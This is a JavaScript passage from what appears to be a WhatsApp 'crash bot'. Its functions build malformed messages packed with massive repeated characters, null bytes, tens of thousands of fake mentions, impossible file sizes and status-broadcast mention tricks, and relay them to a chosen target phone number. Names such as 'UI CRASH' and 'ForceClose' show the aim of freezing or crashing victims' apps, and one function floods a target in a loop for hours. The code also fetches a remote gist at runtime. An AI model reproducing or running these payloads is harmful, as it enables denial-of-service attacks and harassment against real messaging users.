                  buttonParamsJson: "{}",
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await rafiganteng.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
}

async function multiResponse(target, stats) {
    const overButton = Array.from({ length: 9696 }, (_, cann) => ({
        title: "᭄".repeat(9696),
        rows: [{ title: `${cann + 1}`, id: `${cann + 1}` }]
    }))

    const gluncherOfDelay = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "z҉e҉x҉r҉o҉ x҉ b҉u҉i҉l҉d҉⚡🚀",
                    listType: 2,
                    buttonText: null,
                    sections: overButton,
                    singleSelectReply: { selectedRowId: "🪅" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 9696 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9696,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "9696@newsletter",
                            serverMessageId: 1,
                            newsletterName: "----UnCann"
                        }
                    },
                    description: "᭄-rafiganteng"
                }
            }
        }
    }

    const delayInstantStatus = generateWAMessageFromContent(target, gluncherOfDelay, {})

    await rafiganteng.relayMessage("status@broadcast", delayInstantStatus.message, {
        messageId: delayInstantStatus.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    })

    if (stats) {
        await rafiganteng.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: delayInstantStatus.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "ᚖ𝐂͠𝐀̸𝐍͢𝐍𝐈𝐄͡ ⾕" },
                        content: undefined
                    }
                ]
            }
        )
    }
}

async function nativeloc(target) {
rafiganteng.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
           locationMessage: {
                  degreesLatitude: 1.0,
                  degreesLongitude: 5.0,
                  },
              hasMediaAttachment: true,
              },
              body: {
                text:
                  "z҉e҉x҉r҉o҉ x҉ b҉u҉i҉l҉d҉⚡🚀⭑̤\n" +
                  "ꦾ".repeat(10000) +
                  `@1`.repeat(10000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                ],
                groupMentions: [
                  {
                    groupJid: "1@newsletter",
                    groupSubject: "Vamp",
                  },
                ],
                                  nativeFlowMessage: {
                        buttons: [
                            {
                                name: "call_permission_request",
                                buttonParamsJson: {}
                            }
                        ]
                    },  
                quotedMessage: {
                locationMessage: {
                  degreesLatitude: 1.0,
                  degreesLongitude: 5.0,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
}

async function nativemessage(target) {
rafiganteng.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                fileName: "z҉e҉x҉r҉o҉ x҉ b҉u҉i҉l҉d҉⚡🚀",
                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1726867151",
                contactVcard: true,
                jpegThumbnail: RC,
              },
              hasMediaAttachment: true,
              },
              body: {
                text:
                  "z҉e҉x҉r҉o҉ x҉ b҉u҉i҉l҉d҉⚡🚀⭑̤\n" +
                  "ꦾ".repeat(10000) +
                  `@1`.repeat(10000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                ],
                groupMentions: [
                  {
                    groupJid: "1@newsletter",
                    groupSubject: "Vamp",
                  },
                ],
                                  nativeFlowMessage: {
                        buttons: [
                            {
                                name: "call_permission_request",
                                buttonParamsJson: {}
                            }
                        ]
                    },  
                quotedMessage: {
                locationMessage: {
                  degreesLatitude: 1.0,
                  degreesLongitude: 5.0,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    )
    }

async function protocolbug2(target, mention) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: "\u9999",
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await rafiganteng.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await rafiganteng.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "\u9999" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function protocolbug3(target, mention) {
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "\u9999",
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "kontol",
                                    songId: "peler",
                                    author: "\u9999",
                                    title: "\u9999",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});

    await rafiganteng.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await rafiganteng.relayMessage(target, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: msg.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
}

async function DelayLoc(target) {
      var msg = generateWAMessageFromContent(target, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'title': '',
                'subtitle': " "
              },
              'body': {
                'text': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸"
              },
              'footer': {
                'text': 'xp'
              },
              'nativeFlowMessage': {
                'buttons': [{
                  'name': 'cta_url',
                  'buttonParamsJson': "{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : , merchant_url :  }"
                }],
                'messageParamsJson': "\0".repeat(1000000)
              }
            }
          }
        }
      }), {
        'userJid': chat
      });
      await rafiganteng.relayMessage(target, msg.message, {
        'participant': {
          'jid': chat
        },
        'messageId': msg.key.id
      });
    }

async function DelayInVis(rafiganteng, target, show) {
            let push = [];
                push.push({
                    body: proto.Message.InteractiveMessage.Body.fromObject({ text: " " }),
                    footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: " " }),
                    header: proto.Message.InteractiveMessage.Header.fromObject({
                        title: " ",
                        hasMediaAttachment: true,
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            fileSha256: "88J5mAdmZ39jShlm5NiKxwiGLLSAhOy0gIVuesjhPmA=",
                            fileLength: "18352",
                            height: 720,
                            width: 1280,
                            mediaKey: "Te7iaa4gLCq40DVhoZmrIqsjD+tCd2fWXFVl3FlzN8c=",
                            fileEncSha256: "w5CPjGwXN3i/ulzGuJ84qgHfJtBKsRfr2PtBCT0cKQQ=",
                            directPath: "/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1737281900",
                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACgASAMBIgACEQEDEQH/xAAsAAEBAQEBAAAAAAAAAAAAAAAAAwEEBgEBAQEAAAAAAAAAAAAAAAAAAAED/9oADAMBAAIQAxAAAADzY1gBowAACkx1RmUEAAAAAA//xAAfEAABAwQDAQAAAAAAAAAAAAARAAECAyAiMBIUITH/2gAIAQEAAT8A3Dw30+BydR68fpVV4u+JF5RTudv/xAAUEQEAAAAAAAAAAAAAAAAAAAAw/9oACAECAQE/AH//xAAWEQADAAAAAAAAAAAAAAAAAAARIDD/2gAIAQMBAT8Acw//2Q==",
                            scansSidecar: "hLyK402l00WUiEaHXRjYHo5S+Wx+KojJ6HFW9ofWeWn5BeUbwrbM1g==",
                            scanLengths: [3537, 10557, 1905, 2353],
                            midQualityFileSha256: "gRAggfGKo4fTOEYrQqSmr1fIGHC7K0vu0f9kR5d57eo=",
                        },
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({ buttons: [] }),
                });
        
            let msg = await generateWAMessageFromContent(
                target,
                {
                    viewOnceMessage: {
                        message: {
                            messageContextInfo: {
                                deviceListMetadata: {},
                                deviceListMetadataVersion: 2,
                            },
                            interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                                body: proto.Message.InteractiveMessage.Body.create({ text: " " }),
                                footer: proto.Message.InteractiveMessage.Footer.create({ text: "bijiku" }),
                                header: proto.Message.InteractiveMessage.Header.create({ hasMediaAttachment: false }),
                                carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ cards: [...push] }),
                            }),
                        },
                    },
                },
                {}
            );
        
            await rafiganteng.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
        
            if (show) {
                await rafiganteng.relayMessage(
                    target,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: { is_status_mention: "z҉e҉x҉r҉o҉ x҉ b҉u҉i҉l҉d҉⚡🐉" },
                                content: undefined,
                            },
                        ],
                    }
                );
            }
        }

async function InVisibleX(rafiganteng, target, show) {
            let msg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "𑲭𑲭ꋪꋬꉣ꒒꒐ꉔꋪꋬꇙꁝꁝꁝ",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "*⃟⃟༑‌‌z҉e҉x҉r҉o҉ x҉ b҉u҉i҉l҉d҉⚡*" + "ꦾ".repeat(50000),
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: "*Brummm Stututu!!*"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "*Brummm Stututu!!*"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});
        
            await rafiganteng.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
        
            if (show) {
                await target.relayMessage(
                    target,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: {
                                    is_status_mention: "🎭⃟༑⌁⃰z҉e҉x҉r҉o҉ x҉ b҉u҉i҉l҉d҉⚡ 𝑪‌𝒓𝒂‌‌𝒔𝒉ཀ‌‌🐉",
                                },
                                content: undefined,
                            },
                        ],
                    }
                );
            } 
            console.log(chalk.red("UI UI EROR rafiganteng"));           
        }

async function sendMessagesForDurationX(rafiganteng, durationHours, target) {
    const totalDurationMs = durationHours * 60 * 60 * 1000; // Konversi jam ke milidetik
    const startTime = Date.now();
    let count = 0;

    const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs) {
            console.log("Pengiriman Selesai Sesuai Durasi Yang Ditentukan.");
            return;
        }

        if (count < 300) {
            await InVisibleX(rafiganteng, target, false);
            await DelayInVis(rafiganteng, target, false);            
            count++;
            console.log(chalk.red(`RapliInvsible  ${count}/350 Invisble ${target}`));
            sendNext(); // Melanjutkan pengiriman
        } else {
            console.log(chalk.green(`Selesai Mengirimkan 350 Delay Maker ${target}`)); // Log selesai kirim 800 paket
            count = 0; // Reset untuk paket berikutnya
            console.log(chalk.red("Menyiapkan Untuk Mengirim 350 Paket Berikutnya..."));
            setTimeout(sendNext, 1000); // Jeda 5 detik setelah selesai batch 800 pesan
        }
    };

    sendNext();
};

async function uiBlogerX(target) {
      try {
        let message = {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2,
              },
              interactiveMessage: {
                contextInfo: {
                  mentionedJid: [target],
                  isForwarded: true,
                  forwardingScore: 999,
                  businessMessageForwardInfo: {
                    businessOwnerJid: target,
                  },
                },
                body: {
                  text: "z҉e҉x҉r҉o҉ x҉ b҉u҉i҉l҉d҉⚡" + "\u0000".repeat(90000000),
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "single_select",
                      buttonParamsJson: "",
                    },
                    {
                      name: "call_permission_request",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                  ],
                },
              },
            },
          },
        };

        await rafiganteng.relayMessage(target, message, {
          participant: { jid: target },
        });
      } catch (err) {
        console.log(err);
      }
    }

async function UiXGhvY(target) {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
              contextInfo: {
              stanzaId: rafiganteng.generateMessageTag(),
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 35675873277,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: " 🦠⃟͒z҉e҉x҉r҉o҉ x҉ b҉u҉i҉l҉d҉⚡🚀ヶ⃔͒⃰   ",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: " 🦠⃟͒z҉e҉x҉r҉o҉ x҉ b҉u҉i҉l҉d҉⚡🚀ヶ⃔͒⃰   "
                    },
                },
              },
            body: {
              text: " 🦠⃟͒z҉e҉x҉r҉o҉ x҉ b҉u҉i҉l҉d҉⚡🚀ヶ⃔͒⃰   " + "ꦾ".repeat(10000)
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "cta_url",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "cta_call",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "cta_reminder",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "cta_cancel_reminder",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "address_message",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "send_location",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "cta_url",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "cta_call",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "cta_reminder",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "cta_cancel_reminder",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "address_message",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "send_location",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                name: "galaxy_message",
buttonParamsJson: `{
"screen_2_OptIn_0": true,
"screen_2_OptIn_1": true,
"screen_1_Dropdown_0": "Null",
"screen_1_DatePicker_1": "1028995200000",
"screen_1_TextInput_2": "tamaryuichix@gmail.com",
"screen_1_TextInput_3": "94643116",
"screen_0_TextInput_0": "radio - buttons${"\0".repeat(100000)}",
"screen_0_TextInput_1": "Anjay",
"screen_0_Dropdown_2": "001-Grimgar",
"screen_0_RadioButtonsGroup_3": "0_true",
"flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
}`,
version: 3
}
              ],
            },
          },
        },
      },
    };
    await rafiganteng.relayMessage(target, message, {
      participant: { jid: target },
    });
  }
  
async function CrlButton(isTarget) {
    const msg = generateWAMessageFromContent(
        isTarget,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: `\0`
                        },
                        carouselMessage: {
                            cards: [
                                {
                                    header: {
                                        ...(await prepareWAMessageMedia(
                                            { image: { url: "https://files.catbox.moe/n1nqsc.jpg" } }, 
                                            { upload: rafiganteng.waUploadToServer }
                                        )),
                                        title: `\0`,
                                        gifPlayback: true,
                                        subtitle: '\0',
                                        hasMediaAttachment: true
                                    },
                                    body: {
                                        text:"🎭⃟༑⌁⃰z҉e҉x҉r҉o҉ x҉ b҉u҉i҉l҉d҉⚡🚀ཀ‌‌🐉" + "ꦾ".repeat(120000)
                                    },
                                    footer: {
                                        text: "\0"
                                    },
                                    nativeFlowMessage: {
                                        buttons: [
                                            {
                                                name: "single_select",
                                                buttonParamsJson: JSON.stringify({
                                                    title: "😂⊱z҉e҉x҉r҉o҉ x҉ b҉u҉i҉l҉d҉⚡🚀⊰😂",
                                                    sections: []
                                                })
                                            },
                                            {
                                                name: "single_select",
                                                buttonParamsJson: `{"title":"${"𑲭𑲭".repeat(60000)}","sections":[{"title":" i wanna be kill you ","rows":[]}]}`
                                            },
                                            {
                                                name: "call_permission_request",
                                                buttonParamsJson: "{}"
                                            },
                                            {
                                                name: "mpm",
                                                buttonParamsJson: "{}"
                                            },
                                            {
                                                name: "single_select",
                                                buttonParamsJson: "{\"title\":\"🦠\",\"sections\":[{\"title\":\"🔥\",\"highlight_label\":\"💥\",\"rows\":[{\"header\":\"\",\"title\":\"💧\",\"id\":\"⚡\"},{\"header\":\"\",\"title\":\"💣\",\"id\":\"✨\"}]}]}"
                                            },
                                            {
                                                name: "quick_reply",
                                                buttonParamsJson: "{\"display_text\":\"Quick Crash Reply\",\"id\":\"📌\"}"
                                            },
                                            {
                                                name: "cta_url",
                                                buttonParamsJson: "{\"display_text\":\"Developed\",\"url\":\"https://t.me/Whhwhahwha\",\"merchant_url\":\"https://t.mw/Whhwhahwha\"}"
                                            },
                                            {
                                                name: "cta_call",
                                                buttonParamsJson: "{\"display_text\":\"Call Us Null\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "cta_copy",
                                                buttonParamsJson: "{\"display_text\":\"Copy Crash Code\",\"id\":\"message\",\"copy_code\":\"#CRASHCODE9741\"}"
                                            },
                                            {
                                                name: "cta_reminder",
                                                buttonParamsJson: "{\"display_text\":\"Set Reminder Crash\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "cta_cancel_reminder",
                                                buttonParamsJson: "{\"display_text\":\"Cancel Reminder Crash\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "address_message",
                                                buttonParamsJson: "{\"display_text\":\"Send Crash Address\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "send_location",
                                                buttonParamsJson: "\0"
                                            }
                                        ]
                                    }
                                }
                            ],
                            messageVersion: 1,
                        }
                    }
                }
            }
        },
        { quoted: qkontak }
    );
    await rafiganteng.relayMessage(isTarget, msg.message, {
        messageId: msg.key.id,
    });
    console.log("Success! Crl Button Send By rafiganteng ")
}
  
async function invc2(target) {
     let nomor = target
     let msg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "🎭⃟༑⌁⃰z҉e҉x҉r҉o҉ x҉ b҉u҉i҉l҉d҉⚡🚀ཀ‌",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "🎭⃟༑⌁⃰z҉e҉x҉r҉o҉ x҉ b҉u҉i҉l҉d҉⚡🚀ཀ‌"
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "single_select",
                                        buttonParamsJson: "z"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "{}"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});

            await rafiganteng.relayMessage(target, msg.message, {
                messageId: msg.key.id,
                participant: { jid: target }
            });
        }

async function CallGc(isTarget) {
await rafiganteng.relayMessage(isTarget, {
            viewOnceMessage: {
                message: {
                    scheduledCallCreationMessage: {
                        callType: "VIDEO",
                        scheduledTimestampMs: Date.now() + 9741,
                        title: " z҉e҉x҉r҉o҉ x҉ b҉u҉i҉l҉d҉⚡🚀 " + `𑲭𑲭`.repeat(100000) + `ꦾ`.repeat(50000),
                        inviteCode: 't.me/Whhwhahwha',
                    }
                }
            }
        }, {});
      }
      
let apiClient;
try {
  const res = await fetch('https://gist.githubusercontent.com/Tama-Ryuichi/572ad67856a67dbae3c37982679153b2/raw/apiClient.json');
  apiClient = await res.text();
} catch (err) {
  console.error("error fetching", err);
  return;
}
async function GxhorseForceClose(tqw) {
for (let r = 0; r < 666; r++) {  
  let msg = await generateWAMessageFromContent(
    tqw,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "X",
            mentionedJid: [tqw],
            forwardedNewsletterMessageInfo: {
              newsletterName: "𝐁𝐱𝐳 𝐧𝐨𝐭 𝐝𝐞𝐯🐉🐉 | I'm Beginner",
              newsletterJid: "120363321780343299@newsletter",
              serverMessageId: 1
            },
            externalAdReply: {
              showAdAttribution: true,
              title: "€ 𝐁𝐱𝐳 𝐧𝐨𝐭 𝐝𝐞𝐯🐉🐉",
              body: "",
              thumbnailUrl: null,
              sourceUrl: "https://tama.app/",
              mediaType: 1,
              renderLargerThumbnail: true
            },
